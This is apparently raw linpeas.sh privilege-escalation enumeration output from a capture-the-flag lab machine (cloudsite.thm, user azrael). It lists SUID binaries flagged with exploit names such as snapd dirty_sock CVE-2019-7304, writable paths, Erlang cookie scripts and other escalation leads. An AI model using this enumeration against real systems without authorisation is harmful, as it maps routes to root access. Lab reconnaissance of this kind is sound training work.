-rwsr-xr-x 1 root root 121K Jan 25  2023 /snap/snapd/18357/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 133K Apr 24  2024 /snap/snapd/21759/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 84K Feb  6  2024 /snap/core20/2318/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Feb  6  2024 /snap/core20/2318/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Feb  6  2024 /snap/core20/2318/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Apr  9  2024 /snap/core20/2318/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Feb  6  2024 /snap/core20/2318/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Feb  6  2024 /snap/core20/2318/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Apr  9  2024 /snap/core20/2318/usr/bin/su
-rwsr-xr-x 1 root root 163K Apr  4  2023 /snap/core20/2318/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Apr  9  2024 /snap/core20/2318/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 467K Jan  2  2024 /snap/core20/2318/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 84K Nov 29  2022 /snap/core20/1828/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 52K Nov 29  2022 /snap/core20/1828/usr/bin/chsh
-rwsr-xr-x 1 root root 87K Nov 29  2022 /snap/core20/1828/usr/bin/gpasswd
-rwsr-xr-x 1 root root 55K Feb  7  2022 /snap/core20/1828/usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K Nov 29  2022 /snap/core20/1828/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 67K Nov 29  2022 /snap/core20/1828/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 67K Feb  7  2022 /snap/core20/1828/usr/bin/su
-rwsr-xr-x 1 root root 163K Jan 16  2023 /snap/core20/1828/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 39K Feb  7  2022 /snap/core20/1828/usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root systemd-resolve 51K Oct 25  2022 /snap/core20/1828/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 463K Mar 30  2022 /snap/core20/1828/usr/lib/openssh/ssh-keysign

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                         
-rwxr-sr-x 1 root shadow 27K Jan 10  2024 /usr/sbin/unix_chkpwd                                                                                                                         
-rwxr-sr-x 1 root shadow 23K Jan 10  2024 /usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root _ssh 287K Jun 26  2024 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 71K Feb  6  2024 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Feb  6  2024 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 39K Mar 23  2022 /usr/bin/crontab
-rwsr-sr-x 1 daemon daemon 55K Apr 14  2022 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root utmp 15K Mar 24  2022 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 83K Feb  6  2024 /snap/core20/2318/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Feb  6  2024 /snap/core20/2318/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Jan  2  2024 /snap/core20/2318/usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /snap/core20/2318/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Jan 10  2024 /snap/core20/2318/usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 83K Nov 29  2022 /snap/core20/1828/usr/bin/chage
-rwxr-sr-x 1 root shadow 31K Nov 29  2022 /snap/core20/1828/usr/bin/expiry
-rwxr-sr-x 1 root crontab 343K Mar 30  2022 /snap/core20/1828/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 35K Feb  7  2022 /snap/core20/1828/usr/bin/wall
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1828/usr/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 43K Feb  2  2023 /snap/core20/1828/usr/sbin/unix_chkpwd

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                  
files with acls in searched folders Not Found                                                                                                                                           
                                                                                                                                                                                        
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                          
══╣ Current shell capabilities                                                                                                                                                          
./linpeas.sh: 8305: [[: not found                                                                                                                                                       
CapInh:  [Invalid capability format]
./linpeas.sh: 8305: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 8296: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 8305: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 8305: [[: not found
CapAmb:  [Invalid capability format]

╚ Parent process capabilities
./linpeas.sh: 8330: [[: not found                                                                                                                                                       
CapInh:  [Invalid capability format]
./linpeas.sh: 8330: [[: not found
CapPrm:  [Invalid capability format]
./linpeas.sh: 8321: [[: not found
CapEff:  [Invalid capability format]
./linpeas.sh: 8330: [[: not found
CapBnd:  [Invalid capability format]
./linpeas.sh: 8330: [[: not found
CapAmb:  [Invalid capability format]


Files with capabilities (limited to 50):
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/snap/core20/2318/usr/bin/ping cap_net_raw=ep
/snap/core20/1828/usr/bin/ping cap_net_raw=ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                          
                                                                                                                                                                                        
╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso                                                                                                  
/etc/ld.so.conf                                                                                                                                                                         
Content of /etc/ld.so.conf:                                                                                                                                                             
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                                           
  - /usr/local/lib                                                                                                                                                                      
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                                                     
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/                                                                                                                                         
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files                                                                                        
total 64                                                                                                                                                                                
drwxr-xr-x   2 root root  4096 Aug 15  2024 .
drwxr-xr-x 120 root root 12288 Sep 20  2024 ..
-rw-r--r--   1 root root    96 Dec  5  2019 01-locale-fix.sh
-rw-r--r--   1 root root   835 Dec  1  2022 apps-bin-path.sh
-rw-r--r--   1 root root   726 Nov 15  2021 bash_completion.sh
-rw-r--r--   1 root root  1107 Nov  3  2019 gawk.csh
-rw-r--r--   1 root root   757 Nov  3  2019 gawk.sh
-rw-r--r--   1 root root   349 Oct 28  2020 im-config_wayland.sh
-rw-r--r--   1 root root  1368 Jun 12  2024 vte-2.91.sh
-rw-r--r--   1 root root   966 Jun 12  2024 vte.csh
-rw-r--r--   1 root root   954 Mar 26  2020 xdg_dirs_desktop_session.sh
-rw-r--r--   1 root root  1557 Feb 17  2020 Z97-byobu.sh
-rwxr-xr-x   1 root root   841 Feb 27  2024 Z99-cloudinit-warnings.sh
-rwxr-xr-x   1 root root  3396 Jun  5  2024 Z99-cloud-locale-test.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd                                                                            
                                                                                                                                                                                        
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient                                                                                                                                 
-rw-r--r-- 1 root root  3448 Mar 17  2022 usr.bin.man
-rw-r--r-- 1 root root  1687 Feb  8  2024 usr.bin.tcpdump
-rw-r--r-- 1 root root 29450 Apr 24  2024 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root   672 Feb 19  2020 usr.sbin.ippusbxd
-rw-r--r-- 1 root root  1592 Nov 16  2021 usr.sbin.rsyslogd

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                            
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                            
═╣ Can I read shadow files? ............. No                                                                                                                                            
═╣ Can I read shadow plists? ............ No                                                                                                                                            
═╣ Can I write shadow plists? ........... No                                                                                                                                            
═╣ Can I read opasswd file? ............. No                                                                                                                                            
═╣ Can I write in network-scripts? ...... No                                                                                                                                            
═╣ Can I read root folder? .............. No                                                                                                                                            
                                                                                                                                                                                        
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                  
/root/
/var/www
/var/www/cloudsite.thm
/var/www/cloudsite.thm/about_us.html
/var/www/cloudsite.thm/services.html
/var/www/cloudsite.thm/assets
/var/www/cloudsite.thm/assets/webfonts
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.svg
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.svg
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.eot
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.eot
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.svg
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.svg
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.eot
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.eot
/var/www/cloudsite.thm/assets/css
/var/www/cloudsite.thm/assets/css/fontawsom-all.min.css

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
                                                                                                                                                                                        
╔══════════╣ Readable files belonging to root and readable by me but not world readable
                                                                                                                                                                                        
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
/home/azrael                                                                                                                                                                            
/run/lock
/run/screen
/run/screen/S-azrael
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/.Test-unix
/tmp/tmux-1000
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
                                                                                                                                                                                        

╔══════════╣ Writable root-owned executables I can modify (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                        
Writable root-owned executables Not Found                                                                                                                                               
                                                                                                                                                                                        


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                     
                            ╚═════════════════════════╝                                                                                                                                 
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path                                                                                
/usr/local/bin/generate_erlang_cookie.sh                                                                                                                                                
/usr/local/bin/change_cookie_permissions.sh
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2024-09-11+17:46:16.9320045090 /usr/local/bin/change_cookie_permissions.sh                                                                                                              
2024-09-11+11:51:24.4639998210 /usr/local/bin/generate_erlang_cookie.sh
2024-08-15+16:53:58.1417942040 /home/azrael/.local/bin/flask
2024-08-15+09:24:28.4794334960 /usr/local/bin/node
2024-08-15+09:14:13.4008479310 /etc/console-setup/cached_setup_terminal.sh
2024-08-15+09:14:13.3968477190 /etc/console-setup/cached_setup_keyboard.sh
2024-08-15+09:14:13.3968477190 /etc/console-setup/cached_setup_font.sh
2024-07-18+07:13:52.1825728390 /home/azrael/.local/bin/gunicorn

╔══════════╣ Unexpected in root
/core                                                                                                                                                                                   
/swap.img

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                                       
/var/log/syslog
/var/log/journal/c68c5f14902144269ba40f1cba092dfd/user-1000.journal
/var/log/journal/c68c5f14902144269ba40f1cba092dfd/system.journal
/var/log/rabbitmq/erl_crash.dump

╔══════════╣ Syslog configuration (limit 50)
                                                                                                                                                                                        


module(load="imuxsock") # provides support for local system logging



module(load="imklog" permitnonkernelfacility="on")


$ActionFileDefaultTemplate RSYSLOG_TraditionalFileFormat

$RepeatedMsgReduction on

$FileOwner syslog
$FileGroup adm
$FileCreateMode 0640
$DirCreateMode 0755
$Umask 0022
$PrivDropToUser syslog
$PrivDropToGroup syslog

$WorkDirectory /var/spool/rsyslog

$IncludeConfig /etc/rsyslog.d/*.conf
╔══════════╣ Auditd configuration (limit 50)
auditd configuration Not Found                                                                                                                                                          
╔══════════╣ Log files with potentially weak perms (limit 50)                                                                                                                           
   131286     28 -rw-r-----   1 root     adm         25960 Sep 12  2024 /var/log/dmesg.2.gz                                                                                             
   131832    568 -rw-r-----   1 syslog   adm        579894 Sep  9  2024 /var/log/kern.log.3.gz
   133696    324 -rw-r-----   1 syslog   adm        325016 Oct  2 03:10 /var/log/cloud-init.log
   131348     28 -rw-r-----   1 root     adm         26028 Sep 12  2024 /var/log/dmesg.3.gz
   132348     12 -rw-r-----   1 syslog   adm          9411 Sep  9  2024 /var/log/auth.log.3.gz
   133839      4 -rw-r-----   1 syslog   adm          1152 Oct  2 04:18 /var/log/auth.log
   132391    204 -rw-r-----   1 root     adm        203892 Oct  2 03:10 /var/log/cloud-init-output.log
   132429      0 -rw-r--r--   1 landscape landscape        0 Mar 20  2024 /var/log/landscape/sysinfo.log
   139268    236 -rw-r-----   1 syslog    adm         240487 Jul 20  2024 /var/log/syslog.7.gz
   131283     28 -rw-r-----   1 root      adm          25884 Sep 20  2024 /var/log/dmesg.1.gz
   133711     48 -rw-r-----   1 syslog    adm          41867 Oct  2 04:18 /var/log/syslog
   134572   1044 -rw-r-----   1 syslog    adm        1062504 Sep 12  2024 /var/log/cloud-init.log.1
   133179    620 -rw-r-----   1 syslog    adm         634504 Sep 20  2024 /var/log/syslog.2.gz
   132397    396 -rw-r-----   1 syslog    adm         403735 Sep 20  2024 /var/log/kern.log.2.gz
   133270    120 -rw-r-----   1 syslog    adm         122696 Jul 18  2024 /var/log/cloud-init.log.3.gz
   134593      0 -rw-r-----   1 root      adm              0 Sep  9  2024 /var/log/apt/term.log
   136362     12 -rw-r-----   1 root      adm           9763 Aug 15  2024 /var/log/apt/term.log.1.gz
   140023     24 -rw-r-----   1 root      adm          23147 Jul 18  2024 /var/log/apt/term.log.2.gz
   131833     20 -rw-r-----   1 root      adm          18604 Mar 22  2024 /var/log/apt/term.log.3.gz
   133744      4 -rw-r-----   1 syslog    adm                  824 Oct  2 03:10 /var/log/kern.log
   131299     48 -rw-r-----   1 root      adm                47167 Oct  2 03:10 /var/log/dmesg
   133668    144 -rw-r-----   1 syslog    adm               146670 Aug 16  2024 /var/log/cloud-init.log.2.gz
   133427     60 -rw-r-----   1 rabbitmq  rabbitmq           58564 Oct  2 03:10 /var/log/rabbitmq/rabbitmq-server.log.1
   131326    676 -rw-r-----   1 rabbitmq  rabbitmq          689427 Oct  2 04:18 /var/log/rabbitmq/erl_crash.dump
   131640      8 -rw-r-----   1 rabbitmq  rabbitmq            6746 Sep 12  2024 /var/log/rabbitmq/rabbit@forge.log.2.gz
   132285      4 -rw-r-----   1 rabbitmq  rabbitmq            2136 Sep 11  2024 /var/log/rabbitmq/rabbitmq-server.error.log.4.gz
   131290      4 -rw-r-----   1 rabbitmq  rabbitmq            1912 Oct  2 03:10 /var/log/rabbitmq/rabbitmq-server.error.log
   133263      4 -rw-r-----   1 rabbitmq  rabbitmq            3102 Aug 15  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log.1
   131658     16 -rw-r-----   1 rabbitmq  rabbitmq           16142 Oct  2 03:11 /var/log/rabbitmq/rabbit@forge.log
   133826     24 -rw-r-----   1 rabbitmq  rabbitmq           22218 Sep 12  2024 /var/log/rabbitmq/rabbitmq-server.log.3.gz
   131763     24 -rw-r-----   1 rabbitmq  rabbitmq           23844 Sep 11  2024 /var/log/rabbitmq/rabbit@forge.log.3.gz
   140207      4 -rw-r-----   1 rabbitmq  rabbitmq             600 Jul 20  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log.3.gz
   133379     16 -rw-r-----   1 rabbitmq  rabbitmq           12332 Oct  2 03:10 /var/log/rabbitmq/rabbitmq-server.error.log.1
   131839     40 -rw-r-----   1 rabbitmq  rabbitmq           35817 Sep 20  2024 /var/log/rabbitmq/rabbit@forge.log.1
   133358     12 -rw-r-----   1 rabbitmq  rabbitmq           10762 Sep  9  2024 /var/log/rabbitmq/rabbit@forge.log.4.gz
   133297      0 -rw-r-----   1 rabbitmq  rabbitmq               0 Aug 16  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log
   133277      4 -rw-r-----   1 rabbitmq  rabbitmq             444 Jul 23  2024 /var/log/rabbitmq/rabbit@forge_upgrade.log.2.gz
   131673      8 -rw-r-----   1 rabbitmq  rabbitmq            6022 Sep 20  2024 /var/log/rabbitmq/rabbitmq-server.log.2.gz
   131853     16 -rw-r-----   1 rabbitmq  rabbitmq           15481 Oct  2 03:11 /var/log/rabbitmq/rabbitmq-server.log
   133276      4 -rw-r-----   1 rabbitmq  rabbitmq            3476 Sep 12  2024 /var/log/rabbitmq/rabbitmq-server.error.log.3.gz
   133063      4 -rw-r-----   1 rabbitmq  rabbitmq              90 Aug 15  2024 /var/log/rabbitmq/startup_err
   133029      4 -rw-r-----   1 rabbitmq  rabbitmq             580 Aug 15  2024 /var/log/rabbitmq/startup_log
   131661      4 -rw-r-----   1 rabbitmq  rabbitmq            1336 Sep 20  2024 /var/log/rabbitmq/rabbitmq-server.error.log.2.gz
   133695     12 -rw-r-----   1 rabbitmq  rabbitmq           10977 Sep 11  2024 /var/log/rabbitmq/rabbitmq-server.log.4.gz
   132426    100 -rw-r-----   1 syslog    adm                99746 Aug 11  2024 /var/log/kern.log.4.gz
   133831      4 -rw-r-----   1 syslog    adm                 3491 Oct  2 03:10 /var/log/auth.log.1
   136368     84 -rw-r-----   1 syslog    adm                82432 Aug 15  2024 /var/log/syslog.4.gz
   132354    356 -rw-r-----   1 syslog    adm               358146 Oct  2 03:10 /var/log/syslog.1
   131393     48 -rw-r-----   1 root      adm                48818 Sep 20  2024 /var/log/dmesg.0
   133830    876 -rw-r-----   1 syslog    adm               895788 Sep  9  2024 /var/log/syslog.3.gz

╔══════════╣ Files inside /home/azrael (limit 20)
total 52                                                                                                                                                                                
drwx------ 9 azrael azrael 4096 Sep 12  2024 .
drwxr-xr-x 3 root   root   4096 Jul 18  2024 ..
lrwxrwxrwx 1 azrael azrael    9 Mar 22  2024 .bash_history -> /dev/null
-rw-r--r-- 1 azrael azrael  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 azrael azrael 3771 Feb 25  2020 .bashrc
drwx------ 3 azrael azrael 4096 Jul 18  2024 .cache
drwxrwxr-x 4 azrael azrael 4096 Aug 16  2024 chatbotServer
drwx------ 4 azrael azrael 4096 Jul 18  2024 .config
drwx------ 3 azrael azrael 4096 Oct  2 04:18 .gnupg
drwxrwxr-x 5 azrael azrael 4096 Jul 18  2024 .local
drwxrwxr-x 4 azrael azrael 4096 Jul 18  2024 .npm
-rw-r--r-- 1 azrael azrael  807 Feb 25  2020 .profile
drwx------ 3 azrael azrael 4096 Mar 22  2024 snap
-rw------- 1 azrael azrael   33 Aug 11  2024 user.txt

╔══════════╣ Files inside others home (limit 20)
/var/www/cloudsite.thm/about_us.html                                                                                                                                                    
/var/www/cloudsite.thm/services.html
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.svg
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.svg
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.eot
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.eot
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.ttf
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.svg
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.svg
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff
/var/www/cloudsite.thm/assets/webfonts/fa-solid-900.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-light-300.woff
/var/www/cloudsite.thm/assets/webfonts/fa-regular-400.woff2
/var/www/cloudsite.thm/assets/webfonts/fa-brands-400.eot
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                                                                                        
╔══════════╣ Mails (limit 50)
                                                                                                                                                                                        
╔══════════╣ Backup folders
drwx------ 2 root root 4096 Aug 15  2024 /etc/lvm/backup                                                                                                                                
drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/1828/var/backups
total 0

drwxr-xr-x 2 root root 3 Apr 15  2020 /snap/core20/2318/var/backups
total 0

drwxr-xr-x 2 root root 4096 Aug 16  2024 /var/backups
total 1120
-rw-r--r-- 1 root root  51200 Jul 18  2024 alternatives.tar.0
-rw-r--r-- 1 root root  53865 Aug 15  2024 apt.extended_states.0
-rw-r--r-- 1 root root   6684 Aug 15  2024 apt.extended_states.1.gz
-rw-r--r-- 1 root root  10084 Aug 14  2024 apt.extended_states.2.gz
-rw-r--r-- 1 root root  10033 Jul 18  2024 apt.extended_states.3.gz
-rw-r--r-- 1 root root   6955 Jul 18  2024 apt.extended_states.4.gz
-rw-r--r-- 1 root root   6871 Mar 22  2024 apt.extended_states.5.gz
-rw-r--r-- 1 root root   6883 Mar 21  2024 apt.extended_states.6.gz
-rw-r--r-- 1 root root    268 Mar 20  2024 dpkg.diversions.0
-rw-r--r-- 1 root root    100 Mar 14  2023 dpkg.statoverride.0
-rw-r--r-- 1 root root 967321 Mar 22  2024 dpkg.status.0


╔══════════╣ Backup files (limited 100)
-rwxr-xr-x 1 root root 2196 Feb 23  2024 /usr/libexec/dpkg/dpkg-db-backup                                                                                                               
-rw-r--r-- 1 root root 10849 Jul  5  2024 /usr/lib/modules/5.15.0-118-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 13113 Jul  5  2024 /usr/lib/modules/5.15.0-118-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 44008 Dec  5  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 1423 Aug 15  2024 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-310.pyc
-rw-r--r-- 1 root root 1802 Jul 20  2023 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 5564 Apr 26  2023 /usr/lib/erlang/lib/mnesia-4.20.1/ebin/mnesia_backup.beam
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 11886 Aug 15  2024 /usr/share/info/dir.old
-rw-r--r-- 1 root root 2747 Feb 16  2022 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-118/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rw-r--r-- 1 root root 12070 Oct 26  1985 /var/www/storage.cloudsite.thm/node_modules123/form-data/README.md.bak
-rw-r--r-- 1 root root 191 Jul 18  2024 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 0 Aug 15  2024 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 Aug 15  2024 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 2743 Mar 14  2023 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 380 Aug 15  2024 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 375 Aug 15  2024 /etc/xml/docbook-xml.xml.old
-rw-r--r-- 1 root root 359 Aug 15  2024 /etc/xml/catalog.old
-rw-r--r-- 1 root root 357 Aug 15  2024 /etc/xml/sgml-data.xml.old

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/colord/mapping.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 3, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 3    
Found /var/lib/colord/storage.db: SQLite 3.x database, last written using SQLite version 3031001, file counter 3, database pages 7, cookie 0x3, schema 4, UTF-8, version-valid-for 3
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 826, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 3, database pages 6, cookie 0x5, schema 4, UTF-8, version-valid-for 3

 -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
 -> Extracting tables from /var/lib/colord/storage.db (limit 20)                                                                                                                        
 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)                                                                                                            
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)                                                                                                                         
                                                                                                                                                                                        
╔══════════╣ Web files?(output limit)
/var/www/:                                                                                                                                                                              
total 16K
drwxr-xr-x  4 root root 4.0K Aug 15  2024 .
drwxr-xr-x 14 root root 4.0K Mar 21  2024 ..
drwxr-xr-x  3 root root 4.0K Aug 15  2024 cloudsite.thm
drwxr-xr-x  9 root root 4.0K Aug 15  2024 storage.cloudsite.thm

/var/www/cloudsite.thm:
total 80K
drwxr-xr-x  3 root root 4.0K Aug 15  2024 .

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Oct 11  2022 /usr/local/n/versions/node/20.16.0/lib/node_modules/npm/.npmrc                                                                                    
-rw-r--r-- 1 root root 22 Apr 11  2024 /usr/local/n/versions/node/20.16.0/lib/node_modules/npm/node_modules/node-gyp/.release-please-manifest.json
-rw-r--r-- 1 root root 22 Aug 15  2024 /usr/local/lib/node_modules/npm/node_modules/node-gyp/.release-please-manifest.json
-rw------- 1 root root 0 Apr 16  2024 /snap/core20/2318/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/2318/etc/skel/.bash_logout
-rw------- 1 root root 0 Feb  7  2023 /snap/core20/1828/etc/.pwd.lock
-rw-r--r-- 1 root root 220 Feb 25  2020 /snap/core20/1828/etc/skel/.bash_logout
-rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/css/bootstrap/.DS_Store
-rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/css/bootstrap/mixins/.DS_Store
-rw-r--r-- 1 root root 6148 Aug 15  2024 /var/www/storage.cloudsite.thm/css/.DS_Store
